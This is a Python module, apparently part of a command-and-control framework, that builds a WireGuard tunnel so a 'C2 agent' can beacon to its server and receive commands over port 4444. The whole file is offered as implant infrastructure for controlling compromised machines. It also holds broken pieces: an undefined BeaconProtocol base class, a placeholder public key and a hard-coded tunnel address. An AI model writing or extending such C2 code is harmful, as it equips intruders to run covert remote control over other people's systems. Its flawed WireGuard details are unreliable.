#!/usr/bin/env python3
"""
WireGuard Protocol Handler - VPN-based C2
Features: Secure WireGuard tunnel for C2 communication
"""

import os
import subprocess
import json
import time
import socket
import threading
from typing import Optional, Dict, List
import base64
import hashlib

try:
    import wgconfig
    from wgconfig import WGConfig
except ImportError:
    print("[!] wgconfig not installed. Install with: pip install wgconfig")

class WireGuardProtocol:
    """WireGuard protocol handler for C2 communication"""
    
    def __init__(self, interface_name: str = "c2tunnel", 
                 listen_port: int = 51820,
                 private_key: Optional[str] = None,
                 subnet: str = "10.0.0.0/24"):
        self.interface_name = interface_name
        self.listen_port = listen_port
        self.private_key = private_key or self.generate_private_key()
        self.public_key = self.generate_public_key(self.private_key)
        self.subnet = subnet
        self.beacon_id = None
        self.tunnel_socket = None
        self.running = False
        
    def generate_private_key(self) -> str:
        """Generate WireGuard private key"""
        try:
            result = subprocess.run(
                ['wg', 'genkey'],
                capture_output=True,
                text=True
            )
            return result.stdout.strip()
        except:
            # Fallback: generate key manually
            import secrets
            key = secrets.token_bytes(32)
            return base64.b64encode(key).decode()
    
    def generate_public_key(self, private_key: str) -> str:
        """Generate WireGuard public key"""
        try:
            result = subprocess.run(
                ['wg', 'pubkey'],
                input=private_key,
                capture_output=True,
                text=True
            )
            return result.stdout.strip()
        except:
            # Fallback: return placeholder
            return "public_key_placeholder"
    
    def setup_interface(self, endpoint_ip: str, peer_public_key: str) -> bool:
        """Setup WireGuard interface"""
        try:
            # Create wg0.conf
            config_content = f"""
[Interface]
PrivateKey = {self.private_key}
ListenPort = {self.listen_port}
Address = {self.subnet}

[Peer]
PublicKey = {peer_public_key}
AllowedIPs = {self.subnet}
Endpoint = {endpoint_ip}:{self.listen_port}
PersistentKeepalive = 25
"""
            config_path = f"/etc/wireguard/{self.interface_name}.conf"
            with open(config_path, 'w') as f:
                f.write(config_content)
            
            # Bring up interface
            subprocess.run(['wg-quick', 'up', self.interface_name], check=True)
            return True
        except Exception as e:
            return False
    
    def remove_interface(self) -> bool:
        """Remove WireGuard interface"""
        try:
            subprocess.run(['wg-quick', 'down', self.interface_name], check=True)
            return True
        except:
            return False
    
    def start_tunnel(self) -> bool:
        """Start WireGuard tunnel"""
        try:
            # Get tunnel IP
            tunnel_ip = "10.0.0.2"  # Should be assigned dynamically
            
            # Create tunnel socket
            self.tunnel_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.tunnel_socket.settimeout(5)
            self.tunnel_socket.connect((tunnel_ip, 4444))
            self.running = True
            return True
        except Exception as e:
            return False
    
    def send_data(self, data: bytes) -> bool:
        """Send data through tunnel"""
        try:
            if self.tunnel_socket:
                self.tunnel_socket.send(data)
                return True
        except:
            pass
        return False
    
    def receive_data(self, size: int = 4096) -> Optional[bytes]:
        """Receive data through tunnel"""
        try:
            if self.tunnel_socket:
                return self.tunnel_socket.recv(size)
        except:
            pass
        return None


class WireGuardBeaconProtocol(BeaconProtocol):
    """WireGuard beacon protocol for C2 agent"""
    
    def __init__(self, server: str, port: int, peer_public_key: str):
        super().__init__(server, port)
        self.wg = WireGuardProtocol()
        self.wg.setup_interface(server, peer_public_key)
        self.wg.start_tunnel()
        
    def send_beacon(self, data: Dict) -> Optional[str]:
        """Send beacon via WireGuard"""
        try:
            json_data = json.dumps(data).encode()
            if self.wg.send_data(json_data):
                return "beacon_sent"
        except:
            pass
        return None
    
    def receive_commands(self) -> Optional[List[Dict]]:
        """Receive commands via WireGuard"""
        try:
            data = self.wg.receive_data()
            if data:
                return json.loads(data)
        except:
            pass
        return None
